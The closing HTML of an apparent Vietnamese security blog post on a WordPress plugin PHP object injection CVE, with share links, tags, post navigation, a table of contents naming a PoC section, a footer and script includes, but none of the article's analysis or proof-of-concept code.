  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/" data-title="CVE-2025-53572 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/php-object-injection/" class="post-tag" title="Nhãn - Php Object Injection">Php Object Injection</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-11-19-cve-2025-6742/" class="post-nav-item" rel="prev" title="CVE-2025-6742 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-6742 Analysis &amp; POC</a><a href="/vi/posts/2025-11-21-cve-2025-2939/" class="post-nav-item" rel="next" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/json-viewer-element/json-viewer-element.umd.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/a3bb0a59ff47d2e5841fb62f5ac0deed.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
